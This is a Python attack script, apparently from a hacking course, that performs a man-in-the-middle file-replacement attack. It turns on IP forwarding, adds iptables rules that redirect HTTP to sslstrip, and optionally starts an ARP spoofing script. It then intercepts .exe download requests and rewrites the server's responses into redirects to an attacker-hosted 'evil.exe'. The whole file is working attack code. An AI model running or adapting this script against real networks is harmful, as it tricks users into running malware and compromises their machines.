#!/usr/bin/env python

from netfilterqueue import NetfilterQueue as net
import scapy.all as scapy
from subprocess import call, Popen


ack_list = []


def set_load(scapy_pkt, new_load):
    scapy_pkt[scapy.Raw].load = new_load
    del scapy_pkt[scapy.IP].len
    del scapy_pkt[scapy.IP].chksum
    del scapy_pkt[scapy.TCP].chksum
    return scapy_pkt


def process_packet(pkt):
    # convert pkt to a scapy packet
    scapy_pkt = scapy.IP(pkt.get_payload())
    # looking for a HTTP layer which placed in the raw layer
    if scapy_pkt.haslayer(scapy.Raw):
        # dport - destination port (request)
        # if in the TCP layer n dport it set to 80 (http)
        print(scapy_pkt[scapy.TCP].dport)
        print(scapy_pkt[scapy.TCP].sport)
        print("__________")
        if scapy_pkt[scapy.TCP].dport == 10000:
            # if the user download something it will have .exe in the load
            if ".exe" in scapy_pkt[scapy.Raw].load and "10.0.2.4" not in scapy_pkt[scapy.Raw].load:
                print(".exe request")
                ack_list.append(scapy_pkt[scapy.TCP].ack)

        # sport - source port (response)
        elif scapy_pkt[scapy.TCP].sport == 10000:
            print("hey4")
            if scapy_pkt[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_pkt[scapy.TCP].seq)
                print("[+] Replacing file__________")
                modified_pkt = set_load(scapy_pkt,
                                        "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.4/evilfiles/evil.exe\n\n")
                pkt.set_payload(str(modified_pkt))

    pkt.accept()


def input_validation():
    answer = raw_input("Do you want the spoofer to be on your PC ? (y/Y/n/N)")
    while answer not in ["y", "Y", "N", "n"]:
        answer = raw_input("Error, do you want the spoofer to be on your PC ? (y/Y/n/N)")
    return answer


def run_own_pc():
    call(["sudo", "iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "1"])
    call(["sudo", "iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "1"])


def run_different():
    call(["sudo", "iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])


queue = net()
# the process_packet will be executed on each packet that we have
queue.bind(1, process_packet)
try:
    call(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])
    call(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"])
    Popen(['xterm', '-e', 'sudo sslstrip -l 10000'])
    answer = input_validation()
    print(answer)
    if answer in ["y", "Y"]:
        run_own_pc()
    else:
        run_different()
        Popen(['xterm', '-e', 'sudo python3 arp_spoofing.py'])
    queue.run()
except KeyboardInterrupt:
    call(["sudo", "iptables", "--flush"])
    print('\n^C was detected, program exit!')
    queue.unbind()
